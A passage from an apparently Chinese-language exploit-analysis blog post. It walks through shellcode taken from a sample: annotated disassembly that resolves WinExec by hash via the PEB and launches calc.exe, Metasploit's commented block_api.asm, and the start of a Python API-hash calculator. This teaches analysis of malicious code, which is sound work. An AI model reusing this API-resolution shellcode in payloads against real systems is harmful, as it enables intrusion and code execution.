  01D6            <span class="keyword">add</span> <span class="built_in">esi</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0068</span>    31FF            <span class="keyword">xor</span> <span class="built_in">edi</span>,<span class="built_in">edi</span>                  ---+</span><br><span class="line">....006A    AC              lods <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>]          |</span><br><span class="line">....006B    C1CF <span class="number">0D</span>         <span class="keyword">ror</span> <span class="built_in">edi</span>,<span class="number">0xD</span>                     |</span><br><span class="line">....006E    01C7            <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">eax</span>                     | 计算函数名hash</span><br><span class="line">....<span class="number">0070</span>    38E0            <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">ah</span>                       |</span><br><span class="line">....<span class="number">0072</span>  ^ <span class="number">75</span> F6           <span class="keyword">jnz</span> short ....006A           ---+    </span><br><span class="line">....<span class="number">0074</span>    <span class="number">037D</span> F8         <span class="keyword">add</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>-<span class="number">0x8</span>]  | api_hash = dll_name_hash + func_name_hash</span><br><span class="line">....<span class="number">0077</span>    3B7D <span class="number">24</span>         <span class="keyword">cmp</span> <span class="built_in">edi</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0x24</span>] |</span><br><span class="line">....007A  ^ <span class="number">75</span> E4           <span class="keyword">jnz</span> short ....<span class="number">0060</span>           ---+</span><br><span class="line">....007C    <span class="number">58</span>              <span class="keyword">pop</span> <span class="built_in">eax</span></span><br><span class="line">....<span class="number">007D</span>    8B58 <span class="number">24</span>         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x24</span>]</span><br><span class="line">....<span class="number">0080</span>    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0082</span>    <span class="number">66</span>:8B0C4B       <span class="keyword">mov</span> <span class="built_in">cx</span>,<span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">2</span>]</span><br><span class="line">....<span class="number">0086</span>    8B58 1C         <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">eax</span>+<span class="number">0x1C</span>]</span><br><span class="line">....<span class="number">0089</span>    01D3            <span class="keyword">add</span> <span class="built_in">ebx</span>,<span class="built_in">edx</span></span><br><span class="line">....008B    8B048B          <span class="keyword">mov</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]</span><br><span class="line">....008E    01D0            <span class="keyword">add</span> <span class="built_in">eax</span>,<span class="built_in">edx</span></span><br><span class="line">....<span class="number">0090</span>    <span class="number">894424</span> <span class="number">24</span>       <span class="keyword">mov</span> <span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="number">0x24</span>],<span class="built_in">eax</span></span><br><span class="line">....<span class="number">0094</span>    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0095</span>    5B              <span class="keyword">pop</span> <span class="built_in">ebx</span></span><br><span class="line">....<span class="number">0096</span>    <span class="number">61</span>              <span class="keyword">popad</span></span><br><span class="line">....<span class="number">0097</span>    <span class="number">59</span>              <span class="keyword">pop</span> <span class="built_in">ecx</span></span><br><span class="line">....<span class="number">0098</span>    5A              <span class="keyword">pop</span> <span class="built_in">edx</span></span><br><span class="line">....<span class="number">0099</span>    <span class="number">51</span>              <span class="keyword">push</span> <span class="built_in">ecx</span></span><br><span class="line">....009A  ^ FFE0            <span class="keyword">jmp</span> <span class="built_in">eax</span>                         <span class="comment">; 调用查找到的所需api函数</span></span><br><span class="line">....009C    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">....<span class="number">009D</span>    5F              <span class="keyword">pop</span> <span class="built_in">edi</span></span><br><span class="line">....009E    5A              <span class="keyword">pop</span> <span class="built_in">edx</span></span><br><span class="line">....009F    8B12            <span class="keyword">mov</span> <span class="built_in">edx</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">edx</span>]</span><br><span class="line">....00A1  ^ EB <span class="number">8D</span>           <span class="keyword">jmp</span> short ....<span class="number">0030</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....00A3    <span class="number">5D</span>              <span class="keyword">pop</span> <span class="built_in">ebp</span>                 <span class="comment">; ebp=0x....0021</span></span><br><span class="line">....00A4    6A <span class="number">01</span>           <span class="keyword">push</span> <span class="number">0x1</span></span><br><span class="line">....00A6    8D85 B2000000   <span class="keyword">lea</span> <span class="built_in">eax</span>,<span class="built_in">dword</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">ebp</span>+<span class="number">0xB2</span>] <span class="comment">; eax=ebp+0xB2=0x....0021+0xB2=0x....00D3(calc.exe)</span></span><br><span class="line">....00AC    <span class="number">50</span>              <span class="keyword">push</span> <span class="built_in">eax</span></span><br><span class="line">....00AD    <span class="number">68</span> 318B6F87     <span class="keyword">push</span> <span class="number">0x876F8B31</span>         <span class="comment">; WinExec(kernel32.dll),通过hash算法算出的api_hash</span></span><br><span class="line">....00B2    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">....00B4    BB F0B5A256     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0x56A2B5F0</span>      <span class="comment">; ExitProcess(kernel32.dll)</span></span><br><span class="line">....00B9    <span class="number">68</span> A695BD9D     <span class="keyword">push</span> <span class="number">0x9DBD95A6</span>         <span class="comment">; GetVersion(kernel32.dll)</span></span><br><span class="line">....00BE    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">....00C0    3C <span class="number">06</span>           <span class="keyword">cmp</span> <span class="built_in">al</span>,<span class="number">0x6</span></span><br><span class="line">....00C2    7C 0A           <span class="keyword">jl</span> short ....00CE</span><br><span class="line">....00C4    80FB E0         <span class="keyword">cmp</span> <span class="built_in">bl</span>,<span class="number">0xE0</span></span><br><span class="line">....00C7    <span class="number">75</span> <span class="number">05</span>           <span class="keyword">jnz</span> short ....00CE</span><br><span class="line">....00C9    BB 4713726F     <span class="keyword">mov</span> <span class="built_in">ebx</span>,<span class="number">0x6F721347</span>      <span class="comment">; RtlExitUserThread(ntdll.dll)</span></span><br><span class="line">....00CE    6A <span class="number">00</span>           <span class="keyword">push</span> <span class="number">0x0</span></span><br><span class="line">....00D0    <span class="number">53</span>              <span class="keyword">push</span> <span class="built_in">ebx</span></span><br><span class="line">....00D1    FFD5            <span class="keyword">call</span> <span class="built_in">ebp</span></span><br><span class="line">-----------------------------------------------------------------------------------------------------------------------------</span><br><span class="line">....00D3    <span class="number">6361</span> 6C         <span class="keyword">arpl</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">ecx</span>+<span class="number">0x6C</span>],<span class="built_in">sp</span>     <span class="comment">; "calc.exe\x00"</span></span><br><span class="line">....00D6    632E            <span class="keyword">arpl</span> <span class="built_in">word</span> <span class="built_in">ptr</span> <span class="built_in">ds</span>:[<span class="built_in">esi</span>],<span class="built_in">bp</span></span><br><span class="line">....00D8    <span class="number">65</span>:<span class="number">78</span> <span class="number">65</span>        <span class="keyword">js</span> short 03d10140</span><br><span class="line">....00<span class="built_in">DB</span>    000C0C          <span class="keyword">add</span> <span class="built_in">byte</span> <span class="built_in">ptr</span> <span class="built_in">ss</span>:[<span class="built_in">esp</span>+<span class="built_in">ecx</span>],<span class="built_in">cl</span></span><br><span class="line">....00DE    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E0    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E2    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E4    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E6    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br><span class="line">....00E8    0C 0C           <span class="keyword">or</span> <span class="built_in">al</span>,<span class="number">0xC</span></span><br></pre></td></tr></table></figure></p>
<p>&emsp;&emsp;解码完<code>shellcode</code>,然后通过<code>TEB</code>、<code>PEB</code>等结构计算出<code>WinExec()</code>函数的地址,调用<code>WinExec(&quot;calc.exe&quot;,0x1)</code>弹出计算器。计算<code>库函数API地址</code>的shellcode使用的是<code>metasploit-framework</code>中的<a href="https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm" target="_blank" rel="noopener">block_api.asm</a>,此版本为<code>最新版本</code>,近期<code>更新</code>过,与<code>样本</code>中的有些许差别。其<code>具体原理</code>准备重新写一篇文章,这篇就不介绍了,下面的<code>注释</code>写的已经很清楚了。其<code>功能</code>如下：</p>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">;-----------------------------------------------------------------------------;</span></span><br><span class="line"><span class="comment">; Author: Stephen Fewer (stephen_fewer[at]harmonysecurity[dot]com)</span></span><br><span class="line"><span class="comment">; Compatible: NT4 and newer</span></span><br><span class="line"><span class="comment">; Architecture: x86</span></span><br><span class="line"><span class="comment">; Size: 140 bytes</span></span><br><span class="line"><span class="comment">;-----------------------------------------------------------------------------;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">; [BITS16]表示这个段是按照16位进行编译的，代码地址(比如一个label)都是16位的；[BITS32]表示编译时这个段中指令的地址都是32位的。</span></span><br><span class="line">[<span class="meta">BITS</span> <span class="number">32</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment">; Input: The hash of the API to call and all its parameters must be pushed onto stack.</span></span><br><span class="line"><span class="comment">; 输入：要调用的API的hash以及其参数都要布置在栈上。</span></span><br><span class="line"><span class="comment">; Output: The return value from the API call will be in EAX.</span></span><br><span class="line"><span class="comment">; 输出：API调用的返回值将存储在EAX中。</span></span><br><span class="line"><span class="comment">; Clobbers: EAX, ECX and EDX (ala the normal stdcall calling convention)</span></span><br><span class="line"><span class="comment">; Clobbers: EAX, ECX and EDX.汇编中被使用的寄存器的列表(一般的stdcall调用约定)</span></span><br><span class="line"><span class="comment">; Un-Clobbered: EBX, ESI, EDI, ESP and EBP can be expected to remain un-clobbered.</span></span><br><span class="line"><span class="comment">; Un-Clobbered: 预计EBX，ESI，EDI，ESP和EBP不会受到干扰.asm程序外使用这些寄存器,不会受到影响</span></span><br><span class="line"><span class="comment">; <span class="doctag">Note:</span> This function assumes the direction flag has allready been cleared via a CLD instruction.</span></span><br><span class="line"><span class="comment">; 注意：此函数假定方向标志(DF)已通过CLD指令清除。lodsb指令与其有关。</span></span><br><span class="line"><span class="comment">; <span class="doctag">Note:</span> This function is unable to call forwarded exports.</span></span><br><span class="line"><span class="comment">; 注意：此函数不能被转发导出</span></span><br><span class="line"></span><br><span class="line"><span class="symbol">api_call:</span></span><br><span class="line">  <span class="keyword">pushad</span>                     <span class="comment">; 我们为调用者保留所有的寄存器,eax和ecx除外。</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebp</span>, <span class="built_in">esp</span>               <span class="comment">; 创建新的栈帧</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edx</span>, <span class="built_in">edx</span>               <span class="comment">; edx=0x0</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">fs</span>:<span class="built_in">edx</span>+<span class="number">0x30</span>]     <span class="comment">; 获得PEB的指针</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0xc</span>]         <span class="comment">; PEB-&gt;Ldr,_PEB_LDR_DATA结构体的指针</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0x14</span>]        <span class="comment">; 从InMemoryOrderModuleList获取第一个模块,_PEB_LDR_DATA-&gt;InMemoryOrderModuleList(_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks)</span></span><br><span class="line"><span class="symbol">next_mod:</span>                    <span class="comment">;</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">edx</span>+<span class="number">0x28</span>]        <span class="comment">; 获取modules名字的指针(unicode字符串),_LDR_DATA_TABLE_ENTRY-&gt;BaseDllName-&gt;Buffer</span></span><br><span class="line">  <span class="keyword">movzx</span> <span class="built_in">ecx</span>, <span class="built_in">word</span> [<span class="built_in">edx</span>+<span class="number">0x26</span>] <span class="comment">; 将ECX设置为我们要检查的长度,_LDR_DATA_TABLE_ENTRY-&gt;BaseDllName-&gt;MaximumLength</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edi</span>, <span class="built_in">edi</span>               <span class="comment">; 清除EDI，它将存储modules名字的hash</span></span><br><span class="line"><span class="symbol">loop_modname:</span>                <span class="comment">;</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>               <span class="comment">; 清除EAX</span></span><br><span class="line">  <span class="keyword">lodsb</span>                      <span class="comment">; 读入名称的一个字节至al,esi=esi+1(DF=0)</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="string">'a'</span>                <span class="comment">; 一些版本的Windows使用小写modules名字</span></span><br><span class="line">  <span class="keyword">jl</span> not_lowercase           <span class="comment">; 不是小写的情况</span></span><br><span class="line">  <span class="keyword">sub</span> <span class="built_in">al</span>, <span class="number">0x20</span>               <span class="comment">; 如果modules名字使用的是小写，则归一化为大写</span></span><br><span class="line"><span class="symbol">not_lowercase:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">ror</span> <span class="built_in">edi</span>, <span class="number">0xd</span>               <span class="comment">; 循环右移我们的hash值</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>               <span class="comment">; 加上读入的名称的当前字节</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">ecx</span>                    <span class="comment">; 长度减1</span></span><br><span class="line">  <span class="keyword">jnz</span> loop_modname           <span class="comment">; 循环,直到长度为0</span></span><br><span class="line">  <span class="comment">; 现在,我们已经计算出了modules名字的hash</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">edx</span>                   <span class="comment">; 将modules list的当前位置保存(_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks)，以备后用</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">edi</span>                   <span class="comment">; 保存当前modules的hash，以备后用</span></span><br><span class="line">  <span class="comment">; 继续迭代导出地址表</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>+<span class="number">0x10</span>]        <span class="comment">; 获得此modules基地址,_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks+0x10=_LDR_DATA_TABLE_ENTRY-&gt;DllBase</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">edx</span>+<span class="number">0x3c</span>]        <span class="comment">; 获得PE header偏移,e_flanew</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到PE header的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">eax</span>+<span class="number">0x78</span>]        <span class="comment">; 获得导出表(Export Directory)的RVA,_IMAGE_EXPORT_DIRECTORY结构体指针</span></span><br><span class="line">  <span class="keyword">test</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>              <span class="comment">; 测试是否不存在导出表</span></span><br><span class="line">  <span class="keyword">jz</span> get_next_mod1           <span class="comment">; 如果导出表不存在,处理下一个模块</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">eax</span>                   <span class="comment">; 保存当前modules导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ecx</span>, [<span class="built_in">eax</span>+<span class="number">0x18</span>]        <span class="comment">; 获取以名称导出的函数总数,_IMAGE_EXPORT_DIRECTORY-&gt;NumberOfNames</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x20</span>]        <span class="comment">; 获取函数名表的RVA,_IMAGE_EXPORT_DIRECTORY-&gt;AddressOfNames</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到函数名表的虚拟地址</span></span><br><span class="line">  <span class="comment">; 计算模块哈希+函数哈希</span></span><br><span class="line"><span class="symbol">get_next_func:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">test</span> <span class="built_in">ecx</span>, <span class="built_in">ecx</span>              <span class="comment">; 从jecxz更改,以适应下面的随机jmp产生的较大偏移</span></span><br><span class="line">  <span class="keyword">jz</span> get_next_mod            <span class="comment">; 当我们到达Export Address Table表头的时候(向后搜索),表示遍历完成,处理下一个模块</span></span><br><span class="line">  <span class="keyword">dec</span> <span class="built_in">ecx</span>                    <span class="comment">; 减小函数名称计数器</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">esi</span>, [<span class="built_in">ebx</span>+<span class="built_in">ecx</span>*<span class="number">4</span>]       <span class="comment">; 获得函数名称字符串的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">esi</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules基地址,得到函数名称字符串的虚拟地址</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">edi</span>, <span class="built_in">edi</span>               <span class="comment">; 清除edi,其将用来存储函数名的hash</span></span><br><span class="line">  <span class="comment">; 将计算出的hash与我们想寻找的函数的hash进行比较</span></span><br><span class="line"><span class="symbol">loop_funcname:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">xor</span> <span class="built_in">eax</span>, <span class="built_in">eax</span>               <span class="comment">; 清除eax</span></span><br><span class="line">  <span class="keyword">lodsb</span>                      <span class="comment">; 读取函数名(ASCII字符串)的一个字节,esi=esi+1</span></span><br><span class="line">  <span class="keyword">ror</span> <span class="built_in">edi</span>, <span class="number">0xd</span>               <span class="comment">; 循环右移我们的hash值</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, <span class="built_in">eax</span>               <span class="comment">; 加上从函数名中读出的当前字节</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">al</span>, <span class="number">ah</span>                 <span class="comment">; 比较al(当前读出的函数名中的字节)和ah(null)</span></span><br><span class="line">  <span class="keyword">jne</span> loop_funcname          <span class="comment">; 如果不相等,则表示还没到达终止符,继续遍历函数名</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">edi</span>, [<span class="built_in">ebp</span>-<span class="number">8</span>]           <span class="comment">; 将当前模块的hash值与函数名的hash值相加</span></span><br><span class="line">  <span class="keyword">cmp</span> <span class="built_in">edi</span>, [<span class="built_in">ebp</span>+<span class="number">0x24</span>]        <span class="comment">; 将计算出的hash与我们想寻找的函数的hash进行比较 </span></span><br><span class="line">  <span class="keyword">jnz</span> get_next_func          <span class="comment">; 如果没有找到,则继续计算下一个函数的hash</span></span><br><span class="line">  <span class="comment">; 如果找到，则修复栈，调用该函数，然后值，否则计算下一个</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">eax</span>                    <span class="comment">; 从栈上取出当前module的导出表(Export Directory)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x24</span>]        <span class="comment">; 获得导出函数序号表(Export Ordinals Table)的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到导出函数序号表(Export Ordinals Table)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">cx</span>, [<span class="built_in">ebx</span>+<span class="number">2</span>*<span class="built_in">ecx</span>]        <span class="comment">; 获得所需的函数的序号</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">ebx</span>, [<span class="built_in">eax</span>+<span class="number">0x1c</span>]        <span class="comment">; 获得导出函数地址表(Export Address Table)的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">ebx</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到导出函数地址表(Export Address Table)的虚拟地址</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">eax</span>, [<span class="built_in">ebx</span>+<span class="number">4</span>*<span class="built_in">ecx</span>]       <span class="comment">; 获得所需的函数的相对虚拟地址</span></span><br><span class="line">  <span class="keyword">add</span> <span class="built_in">eax</span>, <span class="built_in">edx</span>               <span class="comment">; 加上modules的基地址,得到所需函数的虚拟地址</span></span><br><span class="line">  <span class="comment">; 现在，我们修复栈并执行对所需函数的调用...</span></span><br><span class="line"><span class="symbol">finish:</span></span><br><span class="line">  <span class="keyword">mov</span> [<span class="built_in">esp</span>+<span class="number">0x24</span>], <span class="built_in">eax</span>        <span class="comment">; 使用所需的api地址覆盖旧的eax值,为即将到来的popad做准备</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span>                    <span class="comment">; 清除当前modules的hash</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ebx</span>                    <span class="comment">; 清除modules list的当前位置</span></span><br><span class="line">  <span class="keyword">popad</span>                      <span class="comment">; 恢复所有的调用者的寄存器,除了eax,ecx,edx外,他们在clobbered寄存器列表中</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">ecx</span>                    <span class="comment">; 弹出我们的调用者存放在栈上的原始的返回地址</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edx</span>                    <span class="comment">; 弹出我们的调用者存放在栈上的所需函数的hash值</span></span><br><span class="line">  <span class="keyword">push</span> <span class="built_in">ecx</span>                   <span class="comment">; 将正确的返回地址放在栈上</span></span><br><span class="line">  <span class="keyword">jmp</span> <span class="built_in">eax</span>                    <span class="comment">; 跳转至寻找到的所需的api函数</span></span><br><span class="line">  <span class="comment">; 我们现在自动返回至正确的调用者所在的函数</span></span><br><span class="line"><span class="symbol">get_next_mod:</span>                <span class="comment">;</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">eax</span>                    <span class="comment">; 弹出当前modules导出表(Export Directory)的虚拟地址</span></span><br><span class="line"><span class="symbol">get_next_mod1:</span>               <span class="comment">;</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edi</span>                    <span class="comment">; 弹出当前modules的hash</span></span><br><span class="line">  <span class="keyword">pop</span> <span class="built_in">edx</span>                    <span class="comment">; 恢复modules list的当前位置</span></span><br><span class="line">  <span class="keyword">mov</span> <span class="built_in">edx</span>, [<span class="built_in">edx</span>]             <span class="comment">; 获取下一个module,_LDR_DATA_TABLE_ENTRY-&gt;InMemoryOrderLinks-&gt;Flink</span></span><br><span class="line">  <span class="keyword">jmp</span> next_mod               <span class="comment">; 处理当前模块</span></span><br></pre></td></tr></table></figure>
<blockquote>
<p>调用<code>WinExec()</code>函数时参数如下：</p>
</blockquote>
<figure class="highlight x86asm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0C0C0D40   041E00B4  +-<span class="keyword">CALL</span> 到 WinExec 来自 041E00B2</span><br><span class="line">0C0C0D44   041E00D3  | CmdLine = <span class="string">"calc.exe"</span></span><br><span class="line">0C0C0D48   <span class="number">00000001</span>  +-ShowState = SW_SHOWNORMAL</span><br></pre></td></tr></table></figure>
<blockquote>
<p><code>shellcode</code>中计算<code>api函数hash</code>的算法如下(<code>dll名称</code>使用的是<code>大写字母</code>的<code>unicode</code>字符串)：</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># Author:Sp4n9x</span></span><br><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"></span><br><span class="line">dll_name = <span class="string">"KERNEL32.DLL\x00"</span></span><br><span class="line"><span class="comment"># dll_name = "NTDLL.DLL\x00"</span></span><br><span class="line">func_name = <span class="string">"WinExec\x00"</span></span><br><span class="line"><span class="comment"># func_name = "ExitProcess\x00"</span></span><br><span class="line"><span class="comment"># func_name = "RtlExitUserThread\x00"</span></span><br><span class="line"></span><br><span class="line">bit = <span class="number">32</span> <span class="comment"># Hash位数</span></span><br><span class="line">K = <span class="number">0xD</span> <span class="comment"># 移位数</span></span><br><span class="line">dll_name_hash = <span class="number">0</span></span><br><span class="line">func_name_hash = <span class="number">0</span></span><br><span class="line">api_hash = <span class="number">0</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">circular_shift_right</span> <span class="params">(int_value,k,bit)</span>:</span> </span><br><span class="line">    format_string = <span class="string">'&#123;:0%db&#125;'</span> % bit </span><br><span class="line">    bin_value = format_string.format(int_value) <span class="comment"># 32 bit binary </span></span><br><span class="line">    bin_value = bin_value[-k:] + bin_value[:-k] </span><br><span class="line">    int_value = int(bin_value,<span class="number">2</span>) </span><br><span class="line">    <span class="keyword">return</span> int_value</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">ascii2unicode</span><span 